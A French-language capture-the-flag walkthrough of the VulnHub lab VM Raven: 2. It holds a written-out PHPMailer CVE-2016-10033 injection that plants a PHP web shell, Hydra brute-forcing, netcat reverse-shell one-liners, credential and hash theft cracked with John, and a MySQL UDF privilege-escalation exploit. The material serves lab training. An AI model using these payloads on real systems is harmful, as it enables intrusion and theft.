# Raven: 2

Lecture recommandée : [Walkthrough sur le challenge Raven: 1](/CTF-VulnLabs/raven1)

[Raven: 2](https://www.vulnhub.com/entry/raven_2,269/) est une machine virtuelle vulnérable, conçue par [le consultant en sécurité William McCann](https://wjmccann.github.io/) et publiée sur le site VulnHub au mois de novembre 2018. L'objectif, comme toujours, est de trouver et d'exploiter des vulnérabilités sur la VM fournie, afin d'obtenir les privilèges d'administration (root) et de récupérer un flag, preuve de l'intrusion et synonyme de validation du challenge. À l'heure où ces lignes sont écrites (novembre 2018), il s'agit de la deuxième VM de la [série Raven](https://www.vulnhub.com/series/raven,176/).

## Synopsis

Pourquoi deux ? Dans l'un de [ses billets de blog](https://wjmccann.github.io/blog/2018/11/09/Raven2), William McCann explique s'être rendu compte d'un petit souci [dans sa première VM](https://www.vulnhub.com/entry/raven-1,256/) : en effet, beaucoup de personnes l'ont résolue, mais pas de la manière escomptée. Plusieurs chemins menaient à root sur la VM Raven: 1, ce n'est plus le cas pour Raven: 2. Le pitch est le suivant : _Raven Security_ semble avoir appris de ses erreurs (tant mieux, en tant que leader mondial de la sécurité de l'information !) et a corrigé plusieurs vulnérabilités sur son site vitrine et son serveur. Cela dit, les patchs mis en oeuvre sont-ils suffisants ? À nous de le découvrir, c'est parti pour ce _walkthrough_ ! Attention, spoilers...

## Recherche d'informations

Pour commencer, l'outil [__netdiscover__](https://github.com/alexxy/netdiscover) est utilisé afin de retrouver l'adresse IP de la VM Raven : il s'agit de 192.168.56.102.

```console
root@blinils:~# netdiscover -r 192.168.56.0/24

Currently scanning: Finished!   |   Screen View: Unique Hosts
 
3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180
_____________________________________________________________________________
  IP            At MAC Address     Count     Len  MAC Vendor / Hostname
-----------------------------------------------------------------------------
192.168.56.1    0a:0b:0c:0d:0e:0f      1      60  Unknown vendor
192.168.56.100  08:00:08:00:08:00      1      60  PCS Systemtechnik GmbH
192.168.56.102  08:00:27:27:30:11      1      60  PCS Systemtechnik GmbH
```

Un scan [__nmap__](https://nmap.org/book/man.html#man-description) va nous permettre à la fois d'identifier les services installés sur le serveur, et d'obtenir des informations sur le système d'exploitation. Pas de surprise ici : le résultat est quasi-identique à celui de la première VM : un service SSH est accessible via le port 22, et un serveur Web Apache via le port 80, qui héberge toujours le site vitrine de _Raven Security_.

```console

root@blinils:~# nmap -sT -sV -p- -A 192.168.56.102
--snip--
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 26:81:c1:f3:5e:01:ef:93:49:3d:91:1e:ae:8b:3c:fc (DSA)
|   2048 31:58:01:19:4d:a2:80:a6:b9:0d:40:98:1c:97:aa:53 (RSA)
|   256 1f:77:31:19:de:b0:e1:6d:ca:77:07:76:84:d3:a9:a0 (ECDSA)
|_  256 0e:85:71:a8:a2:c3:08:69:9c:91:c0:3f:84:18:df:ae (ED25519)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Raven Security
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          36548/tcp  status
|_  100024  1          42843/udp  status
36548/tcp open  status  1 (RPC #100024)
MAC Address: 08:00:27:27:30:11 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
--snip--
```

La page d'index est une présentation des activités de l'entreprise _Raven Security_ ; il n'y a toujours pas de fichier ```robots.txt```, mais une recherche manuelle permet de lister les pages suivantes : ```index.html```, ```about.html```, ```service.html```, ```contact.php``` et ```team.html```. Sur cette dernière page Web, on y retrouve l'identité de chaque membre du staff qui, contrairement à celui de _[Bulldog Industries](/CTF-VulnLabs/bulldog2)_, n'a pas été licencié après la compromission de leur serveur. L'onglet Blog redirige toujours vers un site WordPress, aussi vide de contenu que le premier.

![Affichage de l'image INDEX-Raven.png](images/INDEX-Raven.png)

Les outils [__DIRB__](https://tools.kali.org/web-applications/dirb), [__nikto__](https://cirt.net/nikto2-docs/) et [__WordPress Security Scanner__](https://github.com/wpscanteam/wpscan) ne révèlent toujours rien de spécial ; en revanche, une recherche manuelle a permis de trouver le nom d'un utilisateur, ```michael```, qui a rédigé le premier post du blog... comme pour la VM Raven: 1. Deux attaques avec l'outil [__Hydra__](https://sectools.org/tool/hydra/) sont alors lancées : l'une sur le service SSH à la recherche du mot de passe Unix du compte ```michael``` (s'il existe), l'autre sur l'interface d'administration du WordPress à la recherche du mot de passe du compte ```michael``` (qui, lui, existe bien).

```console
root@blinils:~# hydra -l michael -P 500-worst-passwords.txt 192.168.56.102 \
-V http-form-post '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'

--snip--

[DATA] attacking http-post-form://192.168.56.102:80//wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location
[ATTEMPT] target 192.168.56.102 - login "michael" - pass "123456" - 1 of 500 [child 0] (0/0)
[ATTEMPT] target 192.168.56.102 - login "michael" - pass "password" - 2 of 500 [child 1] (0/0)
[ATTEMPT] target 192.168.56.102 - login "michael" - pass "12345678" - 3 of 500 [child 2] (0/0)
[ATTEMPT] target 192.168.56.102 - login "michael" - pass "1234" - 4 of 500 [child 3] (0/0)
[ATTEMPT] target 192.168.56.102 - login "michael" - pass "pussy" - 5 of 500 [child 4] (0/0)
--snip--
[ATTEMPT] target 192.168.56.102 - login "michael" - pass "mistress" - 496 of 500 [child 3] (0/0)
[ATTEMPT] target 192.168.56.102 - login "michael" - pass "phantom" - 497 of 500 [child 6] (0/0)
[ATTEMPT] target 192.168.56.102 - login "michael" - pass "billy" - 498 of 500 [child 1] (0/0)
[ATTEMPT] target 192.168.56.102 - login "michael" - pass "6666" - 499 of 500 [child 0] (0/0)
[ATTEMPT] target 192.168.56.102 - login "michael" - pass "albert" - 500 of 500 [child 5] (0/0)
1 of 1 target completed, 0 valid passwords found
```

Toujours pas de chance pour WordPress. Et pour SSH ?

```console
root@blinils:~# hydra -l michael -P 500-worst-passwords.txt 192.168.56.102 ssh -t 4
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

--snip--

[DATA] attacking ssh://192.168.56.102:22/
1 of 1 target completed, 0 valid passwords found
```

Enfer et damnation ! À tous les coups, la première mesure de sécurité prise par _Raven Security_ a été de modifier le mot de passe du compte ```michael```, qui était... ```michael```, évidemment. Il n'est donc plus possible de s'y connecter en SSH sur la VM Raven: 2. Il va donc falloir trouver un autre moyen d'obtenir un shell sur ce serveur ! Reprenons les outils un à un.

```console
root@blinils:~# dirb http://192.168.56.102 -r

--snip--

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.56.102/ ----
==> DIRECTORY: http://192.168.56.102/css/
==> DIRECTORY: http://192.168.56.102/fonts/
==> DIRECTORY: http://192.168.56.102/img/
+ http://192.168.56.102/index.html (CODE:200|SIZE:16819)
==> DIRECTORY: http://192.168.56.102/js/
==> DIRECTORY: http://192.168.56.102/manual/
+ http://192.168.56.102/server-status (CODE:403|SIZE:302)
==> DIRECTORY: http://192.168.56.102/vendor/
==> DIRECTORY: http://192.168.56.102/wordpress/

--snip--
```

Voilà pour DIRB, il y aura des répertoires à fouiller de fond en comble. Et pour WPScan ?

```console
root@blinils:~# wpscan -u "http://192.168.56.102/wordpress"

--snip--

[+] Interesting header: LINK: <http://raven.local/wordpress/index.php/wp-json/>; rel="https://api.w.org/"
[+] Interesting header: SERVER: Apache/2.4.10 (Debian)
[+] XML-RPC Interface available under: http://192.168.56.102/wordpress/xmlrpc.php   [HTTP 405]
[+] Found an RSS Feed: http://raven.local/wordpress/index.php/feed/   [HTTP 0]
[!] Upload directory has directory listing enabled: http://192.168.56.102/wordpress/wp-content/uploads/
[!] Includes directory has directory listing enabled: http://192.168.56.102/wordpress/wp-includes/

[+] Enumerating WordPress version ...

[+] WordPress version 4.8.7 (Released on 2018-07-05) identified from meta generator, links opml

--snip--
```

Rien de bien intéressant par ici, si ce n'est le troisième flag à récupérer dans le répertoire ```/uploads/2018/11``` du site WordPress.

Le premier flag se situe quant à lui dans le fichier ```PATH``` du répertoire ```/vendor```, signe qu'il s'agit d'une bonne piste à explorer. On y retrouve des fichiers relatifs à [PHPMailer](https://en.wikipedia.org/wiki/PHPMailer), une bibliothèque logicielle d'envoi d'e-mails en PHP. Une brève recherche sur Internet révèle qu'il existe des vulnérabilités ET des exploits pour cette bibliothèque, en particulier la [CVE-2016-10033](https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html) et ça tombe bien, la version de PHPMailer installée sur le serveur Raven: 2 est vulnérable, en témoignent les fichiers ```SECURITY.md``` et ```VERSION```.

```console
root@blinils:~# curl -s http://192.168.56.102/vendor/SECURITY.md | head -n 6
# Security notices relating to PHPMailer

Please disclose any vulnerabilities found responsibly - report any security problems found to the maintainers privately.

PHPMailer versions prior to 5.2.18 (released December 2016) are vulnerable to [CVE-2016-10033](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-10033)
a remote code execution vulnerability, responsibly reported by [Dawid Golunski](https://legalhackers.com).


root@blinils:~# curl -s http://192.168.56.102/vendor/VERSION
5.2.16
```

La vulnérabilité, découverte par le chercheur en sécurité [Dawid Golunski](https://twitter.com/dawid_golunski), permet d'exécuter du code malveillant à distance (_Remote Code Execution_ a.k.a. RCE). En résumé, les informations fournies par l'utilisateur, via un formulaire d'inscription ou de contact, sont injectées dans la commande ```/usr/bin/sendmail``` exécutée côté serveur. L'attaque consiste à créer un fichier de log sur le serveur avec l'option ```-X``` (dans le champ ```e-mail```), puis y adjoindre du code PHP (dans le corps du message) qui sera exécuté dans ledit fichier de log. En l'occurrence, l'exploitation du serveur Raven: 2 se fera via le formulaire ```contact.php```. 

```console
POST /contact.php HTTP/1.1
Host: 192.168.56.102
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html, */*; q=0.01
Accept-Language: fr-FR,fr;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://192.168.56.102/contact.php
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 199
DNT: 1
Connection: close

action=submit&name=name&email="attacker\" -oQ/tmp/ -X/var/www/html/vendor/blinils.php some"@email.com&subject=subject&message=<?php echo "|".base64_encode(system(base64_decode($_GET["cmd"])))."|"; ?>
```

Et hop ! On obtient un nouveau fichier dans le répertoire ```/vendor```.

![Affichage de l'image INDEX-Vendor.png](images/INDEX-Vendor.png)

Le fichier nouvellement créé ressemble effectivement à un fichier de log. À un détail près : si on appelle ce fichier de log en renseignant correctement le paramètre ```cmd``` dans l'URL, il est possible d'exécuter du code sur le serveur. Exemple avec la commande ```id``` qui équivaut à ```aWQ=``` en [base64](https://fr.wikipedia.org/wiki/Base64).

```console
root@blinils:~# curl -s http://192.168.56.102/vendor/blinils.php?cmd=aWQ= | head -n 15
01211 >>> some"@email.com... Unbalanced '"'
01211 <<< To: Hacker <admin@vulnerable.com>
01211 <<< Subject: Message from name
01211 <<< X-PHP-Originating-Script: 0:class.phpmailer.php
01211 <<< Date: Fri, 16 Nov 2018 20:20:27 +1100
01211 <<< From: Vulnerable Server <"attacker\" -oQ/tmp/ -X/var/www/html/vendor/blinils.php some"@email.com>
01211 <<< Message-ID: <0231383ec9ede649a79d84a0800f8361@192.168.56.102>
01211 <<< X-Mailer: PHPMailer 5.2.17 (https://github.com/PHPMailer/PHPMailer)
01211 <<< MIME-Version: 1.0
01211 <<< Content-Type: text/plain; charset=iso-8859-1
01211 <<< 
01211 <<< uid=33(www-data) gid=33(www-data) groups=33(www-data)
|dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzMod3d3LWRhdGEpIGdyb3Vwcz0zMyh3d3ctZGF0YSk=|01211 <<< 
01211 <<< [EOF]
01211 === CONNECT [127.0.0.1]
```

![Affichage de l'image INDEX-Backdoor.png](images/INDEX-Backdoor.png)

Les commandes sont donc exécutées en tant que ```uid=33(www-data) gid=33(www-data) groups=33(www-data)``` c'est parfait. À présent, nous allons mettre en place [un reverse shell à l'aide de netcat](https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/#Netcat) : le bout de code ```nc -e /bin/bash 192.168.56.101 12345``` va créer une connexion sur le port 12345 entre le serveur Raven: 2 (192.168.56.102) et notre propre machine (192.168.56.101). Pour cela, il faut transmettre cette ligne de commande via le paramètre ```cmd```, et en base64 qui plus est.

```console
root@blinils:~# echo -n "nc -e /bin/bash 192.168.56.101 12345" | base64
bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguNTYuMTAxIDEyMzQ1

root@blinils:~# curl http://192.168.56.102/vendor/blinils.php?cmd=bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguNTYuMTAxIDEyMzQ1
^C
```

En parallèle, la commande ```nc -nlvp 12345``` a été lancé dans un autre terminal... et c'est le shell !

```console
root@blinils:~# nc -nlvp 12345
listening on [any] 12345 ...
connect to [192.168.56.101] from (UNKNOWN) [192.168.56.102] 36182

python -c 'import pty; pty.spawn("/bin/bash")'
www-data@Raven:/var/www/html/vendor$ 

www-data@Raven:/var/www/html/vendor$ id; uname -a;
id; uname -a;
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux Raven 3.16.0-6-amd64 #1 SMP Debian 3.16.57-2 (2018-07-14) x86_64 GNU/Linux

www-data@Raven:/var/www/html/vendor$ 
```

Tout comme lors du premier challenge Raven, le fichier ```/etc/passwd``` témoigne de l'existence d'un deuxième utilisateur potentiellement intéressant : ```steven```. D'autre part, le fichier de configuration ```wp-config.php``` nous donne le sésame de la base de données présente sur le serveur ; ça tombe bien, c'est le même que Raven: 1. Enfin, la recherche du mot-clé ```flag``` sur le serveur a été concluante : les deuxième et troisième flags du CTF ont été (re)trouvés.

```console
www-data@Raven:/var/www/html/vendor$ find / -type f -name "*flag*" 2>/dev/null
<l/vendor$ find / -type f -name "*flag*" 2>/dev/null
/proc/kpageflags
/proc/sys/kernel/acpi_video_flags
/var/www/html/wordpress/wp-content/uploads/2018/11/flag3.png
/var/www/html/wordpress/wp-includes/images/icon-pointer-flag-2x.png
/var/www/html/wordpress/wp-includes/images/icon-pointer-flag.png
/var/www/flag2.txt
--snip--

www-data@Raven:/var/www/html/vendor$ tail -n5 /etc/passwd
tail -n5 /etc/passwd
michael:x:1000:1000:michael,,,:/home/michael:/bin/bash
smmta:x:108:114:Mail Transfer Agent,,,:/var/lib/sendmail:/bin/false
smmsp:x:109:115:Mail Submission Program,,,:/var/lib/sendmail:/bin/false
mysql:x:110:116:MySQL Server,,,:/nonexistent:/bin/false
steven:x:1001:1001::/home/steven:/bin/sh

www-data@Raven:/var/www/html/vendor$ cat /var/www/html/wordpress/wp-config.php | grep DB
<l/vendor$ cat /var/www/html/wordpress/wp-config.php | grep DB
define('DB_NAME', 'wordpress');
define('DB_USER', 'root');
define('DB_PASSWORD', 'R@v3nSecurity');
define('DB_HOST', 'localhost');
define('DB_CHARSET', 'utf8mb4');
define('DB_COLLATE', '');
```

On se connecte ainsi avec les identifiants trouvés, et on récupère le contenu de la table ```wp_users```.

```console
www-data@Raven:/var/www/html/vendor$ mysql -u root -p
mysql -u root -p
Enter password: R@v3nSecurity

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 37
Server version: 5.5.60-0+deb8u1 (Debian)

Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| wordpress          |
+--------------------+
4 rows in set (0.01 sec)

mysql> use wordpress;
use wordpress;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
12 rows in set (0.00 sec)

mysql> select ID, user_login, user_pass, user_email, display_name from wp_users;
select ID, user_login, user_pass, user_email, display_name from wp_users;
+----+------------+------------------------------------+-------------------+----------------+
| ID | user_login | user_pass                          | user_email        | display_name   |
+----+------------+------------------------------------+-------------------+----------------+
|  1 | michael    | $P$BjRvZQ.VQcGZlDeiKToCQd.cPw5XCe0 | michael@raven.org | michael        |
|  2 | steven     | $P$B6X3H3ykawf2oHuPsbjQiih5iJXqad. | steven@raven.org  | Steven Seagull |
+----+------------+------------------------------------+-------------------+----------------+
2 rows in set (0.00 sec)

mysql> exit
exit
Bye
www-data@Raven:/var/www/html/vendor$ 
```

Avec un peu de chance, [__John The Ripper__](https://www.openwall.com/john/) ne fera qu'une bouchée de ces hashs.

```console
root@blinils:~# cat pass-wordpress-raven.txt
michael:$P$BjRvZQ.VQcGZlDeiKToCQd.cPw5XCe0
steven:$P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/

root@blinils:~# john pass-wordpress-raven.txt --wordlist=rockyou.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])
Press 'q' or Ctrl-C to abort, almost any other key for status
LOLLOL1           (steven)
1g 0:00:44:44 DONE (2018-11-22 22:22) 0.000381g/s 5473p/s 5490c/s 5490C/s            ..*7¡Vamos!
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Contrairement à la VM Raven: 1, Steven n'utilise pas le même mot de passe pour ses accès SSH et WordPress.

Il va falloir trouver un autre moyen de passer root, et la solution ne doit certainement pas résider dans la robustesse des mots de passe. Après une longue recherche et plusieurs échecs, une piste sérieuse se dessine : MySQL est exécuté avec les privilèges de root ! L'exploit _[MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library](https://www.exploit-db.com/exploits/1518/)_ fera parfaitement l'affaire et en plus, il n'y a qu'à suivre les instructions en commentaires.

```console
www-data@Raven:/var/mail$ ps -ef | grep mysql
ps -ef | grep mysql
root       539     1  0 Nov25 ?        00:00:00 /bin/sh /usr/bin/mysqld_safe
root       908   539  0 Nov25 ?        00:00:12 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin
--user=root --log-error=/var/log/mysql/error.log --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306
www-data  2121  1616  0 02:36 pts/1    00:00:00 grep mysql
```

Voici les commandes à réaliser sur le poste attaquant...

```console
root@blinils:~# searchsploit mysql | grep local | grep UDF
MySQL 4.0.17 (Linux) - User-Defined Function (UDF) Dynamic Library (1)     | exploits/linux/local/1181.c
MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)    | exploits/linux/local/1518.c
MySQL 4/5/6 - UDF for Command Execution                                    | exploits/linux/local/7856.txt

root@blinils:~# searchsploit -m 1518
  Exploit: MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)
      URL: https://www.exploit-db.com/exploits/1518/
     Path: /usr/share/exploitdb/exploits/linux/local/1518.c
File Type: C source, ASCII text, with CRLF line terminators

Copied to: /root/1518.c

root@blinils:~# mv /root/1518.c raptor_udf2.c

root@blinils:~# gcc -g -c raptor_udf2.c

root@blinils:~# gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

root@blinils:~# ls raptor*
raptor_udf2.c  raptor_udf2.o  raptor_udf2.so

root@blinils:~# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
```

... puis les commandes à réaliser sur le serveur Raven: 2...

```console

www-data@Raven:/tmp$ wget -q http://192.168.56.101:8000/raptor_udf2.so
wget -q http://192.168.56.101:8000/raptor_udf2.so

www-data@Raven:/tmp$ ls
ls
raptor_udf2.so

www-data@Raven:/tmp$ mysql -u root -p
mysql -u root -p
Enter password: R@v3nSecurity

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 38
Server version: 5.5.60-0+deb8u1 (Debian)

--snip--

mysql> use mysql;
use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> create table foo(line blob);
create table foo(line blob);
Query OK, 0 rows affected (0.01 sec)

mysql> insert into foo values(load_file('/tmp/raptor_udf2.so'));
insert into foo values(load_file('/tmp/raptor_udf2.so'));
Query OK, 1 row affected (0.00 sec)

mysql> select * from foo into dumpfile '/usr/lib//mysql/plugin/raptor_udf2.so';
<to dumpfile '/usr/lib//mysql/plugin/raptor_udf2.so';
Query OK, 1 row affected (0.00 sec)

mysql> create function do_system returns integer soname 'raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
Query OK, 0 rows affected (0.00 sec)

mysql> select * from mysql.func;
select * from mysql.func;
+-----------+-----+----------------+----------+
| name      | ret | dl             | type     |
+-----------+-----+----------------+----------+
| do_system |   2 | raptor_udf2.so | function |
+-----------+-----+----------------+----------+
1 row in set (0.00 sec)

mysql> select do_system('nc -e /bin/bash 192.168.56.101 12345');
select do_system('nc -e /bin/bash 192.168.56.101 12345');
^C
```

... et enfin, on récupère la connexion sur le poste de l'attaquant ! Root woot woot ! 

```console
root@blinils:~# nc -nlvp 12345
listening on [any] 12345 ...
connect to [192.168.56.101] from (UNKNOWN) [192.168.56.102] 40580

id
uid=0(root) gid=0(root) groups=0(root)

uname -a
Linux Raven 3.16.0-6-amd64 #1 SMP Debian 3.16.57-2 (2018-07-14) x86_64 GNU/Linux

ls -al /root/flag4.txt
-rw-r--r-- 1 root root 397 Nov  9 08:31 /root/flag4.txt

```

Merci beaucoup à [William McCann](https://wjmccann.github.io/) pour cette VM améliorée !

Après Raven: 1, c'était très plaisant d'arriver jusqu'à root sans aucun mot de passe par défaut, ou de privilèges sudo abusifs. 